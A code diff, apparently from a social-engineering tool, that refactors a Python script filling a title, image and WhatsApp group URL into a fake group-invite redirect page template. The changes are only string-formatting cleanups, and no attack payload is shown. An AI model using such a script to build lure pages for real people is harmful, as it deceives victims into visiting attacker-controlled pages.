@@ -16,25 +16,25 @@ redirect = os.getenv('REDIRECT')
 if title is None:
     title = input(f'{G}[+] {C}Group Title : {W}')
 else:
-    utils.print(f'{G}[+] {C}Group Title :{W} '+title)
+    utils.print(f'{G}[+] {C}Group Title :{W} {title}')
 
 if image is None:
     image = input(f'{G}[+] {C}Path to Group Img (Best Size : 300x300): {W}')
 else:
-    utils.print(f'{G}[+] {C}Group Image :{W} '+image)
+    utils.print(f'{G}[+] {C}Group Image :{W} {image}')
 
 if redirect is None:
-    redirect = input(G + '[+]' + C + ' Enter WhatsApp Group URL : ' + W)
+    redirect = input(f'{G}[+]{C} Enter WhatsApp Group URL : {W}')
 else:
-    utils.print(f'{G}[+] {C}WhatsApp Group URL :{W} '+redirect)
+    utils.print(f'{G}[+] {C}WhatsApp Group URL :{W} {redirect}')
 
 img_name = utils.downloadImageFromUrl(image, 'template/whatsapp_redirect/images/')
-if img_name :
+if img_name:
     img_name = img_name.split('/')[-1]
 else:
     img_name = image.split('/')[-1]
     try:
-        shutil.copyfile(image, 'template/whatsapp_redirect/images/{}'.format(img_name))
+        shutil.copyfile(image, f'template/whatsapp_redirect/images/{img_name}')
     except Exception as e:
         utils.print('\n' + R + '[-]' + C + ' Exception : ' + W + str(e))
         exit()
@@ -45,7 +45,7 @@ with open('template/whatsapp_redirect/index_temp.html', 'r') as index_temp:
         code = code.replace('window.location = "https:" + restOfUrl;', '')
     code = code.replace('$TITLE$', title)
     code = code.replace('REDIRECT_URL', redirect)
-    code = code.replace('$IMAGE$', 'images/{}'.format(img_name))
+    code = code.replace('$IMAGE$', f'images/{img_name}')
 
 with open('template/whatsapp_redirect/index.html', 'w') as new_index:
     new_index.write(code)
